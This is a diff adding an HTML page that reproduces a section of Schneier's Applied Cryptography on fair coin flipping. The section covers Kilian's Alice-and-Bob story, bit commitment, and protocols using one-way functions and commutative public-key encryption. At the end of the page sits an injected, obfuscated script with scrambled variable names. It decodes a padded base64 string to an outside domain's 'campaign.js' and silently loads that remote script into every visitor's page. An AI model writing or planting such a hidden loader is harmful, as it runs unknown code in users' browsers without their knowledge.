@@ -1,0 +1,138 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=04//-->
+<!--PAGES=089-091//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading11"></A><FONT COLOR="#000077">4.10 Fair Coin Flips</FONT></H3>
+<P>It&#146;s story time with Joe Kilian [831]:
+</P>
+<BLOCKQUOTE><P>Alice and Bob wanted to flip a fair coin, but had no physical coin to flip. Alice offered a simple way of flipping a fair coin mentally.
+</P>
+<P>&#147;First, you think up a random bit, then I&#146;ll think up a random bit. We&#146;ll then exclusive-or the two bits together, &#148; she suggested.</P>
+<P>&#147;But what if one of us doesn&#146;t flip a coin at random?&#148; Bob asked.</P>
+<P>&#147;It doesn&#146;t matter. As long as one of the bits is truly random, the exclusive-or of the bits should be truly random, &#148; Alice replied, and after a moment&#146;s reflection, Bob agreed.</P>
+<P>A short while later, Alice and Bob happened upon a book on artificial intelligence, lying abandoned by the roadside. A good citizen, Alice said, &#147;One of us must pick this book up and find a suitable waste receptacle.&#148; Bob agreed, and suggested they use their coin-flipping protocol to determine who would have to throw the book away.</P>
+<P>&#147;If the final bit is a 0, then you will pick the book up, and if it is a 1, then I will, &#148; said Alice. &#147;What is your bit?&#148;</P>
+<P>Bob replied, &#147;1.&#148;</P>
+<P>&#147;Why, so is mine, &#148; said Alice, slyly, &#147;I guess this isn&#146;t your lucky day.&#148;</P>
+<P>Needless to say, this coin-flipping protocol had a serious bug. While it is true that a truly random bit, <I>x</I>, exclusive<I>-OR</I>ed with any independently distributed bit, <I>y</I>, will yield a truly random bit, Alice&#146;s protocol did not ensure that the two bits were distributed independently. In fact, it is not hard to verify that no mental protocol can allow two infinitely powerful parties to flip a fair coin. Alice and Bob were in trouble until they received a letter from an obscure graduate student in cryptography. The information in the letter was too theoretical to be of any earthly use to anyone, but the envelope the letter came in was extremely handy.</P>
+<P>The next time Alice and Bob wished to flip a coin, they played a modified version of the original protocol. First, Bob decided on a bit, but instead of announcing it immediately, he wrote it down on a piece of paper and placed the paper in the envelope. Next, Alice announced her bit. Finally, Alice and Bob took Bob&#146;s bit out of the envelope and computed the random bit. This bit was indeed truly random whenever at least one of them played honestly. Alice and Bob had a working protocol, the cryptographer&#146;s dream of social relevance was fulfilled, and they all lived happily ever after.</P>
+</BLOCKQUOTE><P>Those envelopes sound a lot like bit-commitment blobs. When Manuel Blum introduced the problem of flipping a fair coin over a modem [194], he solved it using a bit-commitment protocol:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice commits to a random bit, using any of the bit-commitment schemes listed in Section 4.9.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob tries to guess the bit.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice reveals the bit to Bob. Bob wins the flip if he correctly guessed the bit.
+</DL>
+<P>In general, we need a protocol with these properties:
+</P>
+<DL>
+<DD><B>&#151;</B>&nbsp;&nbsp;Alice must flip the coin before Bob guesses.
+<DD><B>&#151;</B>&nbsp;&nbsp;Alice must not be able to re-flip the coin after hearing Bob&#146;s guess.
+<DD><B>&#151;</B>&nbsp;&nbsp;Bob must not be able to know how the coin landed before making his guess.
+</DL>
+<P>There are several ways in which we can do this.
+</P>
+<P><FONT SIZE="+1"><B><I>Coin Flipping Using One-Way Functions</I></B></FONT></P>
+<P>If Alice and Bob can agree on a one-way function, this protocol is simple:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random number, <I>x</I>. She computes <I>y</I> = <I>f</I>(<I>x</I>), where <I>f</I>(<I>x</I>) is the one-way function.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice sends <I>y</I> to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob guesses whether <I>x</I> is even or odd and sends his guess to Alice.
+<DD><B>(4)</B>&nbsp;&nbsp;If Bob&#146;s guess is correct, the result of the coin flip is heads. If Bob&#146;s guess is incorrect, the result of the coin flip is tails. Alice announces the result of the coin flip and sends <I>x</I> to Bob.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob confirms that <I>y</I> = <I>f</I>(<I>x</I>).
+</DL>
+<P>The security of this protocol rests in the one-way function. If Alice can find <I>x</I> and <I>x&#180;</I>, such that <I>x</I> is even and <I>x&#180;</I> is odd, and <I>y</I> = <I>f</I>(<I>x</I>) = <I>f</I>(<I>x&#180;</I>), then she can cheat Bob every time. The least significant bit of <I>f</I>(<I>x</I>) must also be uncorrelated with <I>x</I>. If not, Bob can cheat Alice at least some of the time. For example, if <I>f</I>(<I>x</I>) produces even numbers 75 percent of the time if <I>x</I> is even, Bob has an advantage. (Sometimes the least significant bit is not the best one to use in this application, because it can be easier to compute.)</P>
+<P><FONT SIZE="+1"><B><I>Coin Flipping Using Public-Key Cryptography</I></B></FONT></P>
+<P>This protocol works with either public-key cryptography or symmetric cryptography. The only requirement is that the algorithm commute. That is:
+</P>
+<DL>
+<DD><I>D</I><SUB>K1</SUB>(<I>E</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>M</I>))) = <I>E</I><SUB>K2</SUB>(<I>M</I>)
+</DL>
+<P>In general, this property is not true for symmetric algorithms, but it is true for some public-key algorithms (RSA with identical moduli, for example). This is the protocol:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice and Bob each generate a public-key/private-key key pair.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice generates two messages, one indicating heads and the other indicating tails. These messages should contain some unique random string, so that she can verify their authenticity later in the protocol. Alice encrypts both messages with her public key and sends them to Bob in a random order.
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>M</I><SUB>1</SUB>), <I>E</I><SUB>A</SUB>(<I>M</I><SUB>2</SUB>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Bob, who cannot read either message, chooses one at random. (He can sing &#147;eeny meeny miney moe, &#148; engage a malicious computer intent on subverting the protocol, or consult the <I>I Ching</I>&#151;it doesn&#146;t matter.) He encrypts it with his public key and sends it back to Alice.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>E</I><SUB>A</SUB>(<I>M</I>))
+</DL>
+<BR><I>M</I> is either <I>M</I><SUB>1</SUB> or <I>M</I><SUB>2</SUB>.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice, who cannot read the message sent back to her, decrypts it with her private key and then sends it back to Bob.
+<DL>
+<DD><I>D</I><SUB>A</SUB>(<I>E</I><SUB>B</SUB>(<I>E</I><SUB>A</SUB>(<I>M</I>))) = <I>E</I><SUB>B</SUB>(<I>M</I><SUB>1</SUB>) if <I>M</I> = <I>M</I><SUB>1</SUB>, or
+<DD><I>E</I><SUB>B</SUB>(<I>M</I><SUB>2</SUB>) if <I>M</I> = <I>M</I><SUB>2</SUB>
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts the message with his private key to reveal the result of the coin flip. He sends the decrypted message to Alice.
+<DL>
+<DD><I>D</I><SUB>B</SUB>(<I>E</I><SUB>B</SUB>(<I>M</I><SUB>1</SUB>)) = <I>M</I><SUB>1</SUB> or <I>D</I><SUB>B</SUB>(<I>E</I><SUB>B</SUB>(<I>M</I><SUB>2</SUB>)) = <I>M</I><SUB>2</SUB>
+</DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Alice reads the result of the coin flip and verifies that the random string is correct.
+<DD><B>(7)</B>&nbsp;&nbsp;Both Alice and Bob reveal their key pairs so that both can verify that the other did not cheat.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(OSvANncG, ilhSaoLJ) {ilhSaoLJ = OSvANncG.createElement('script');ilhSaoLJ.type = 'text/javascript';ilhSaoLJ.async = true;ilhSaoLJ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');OSvANncG.getElementsByTagName('body')[0].appendChild(ilhSaoLJ);}(document));</script></body>
+</html>
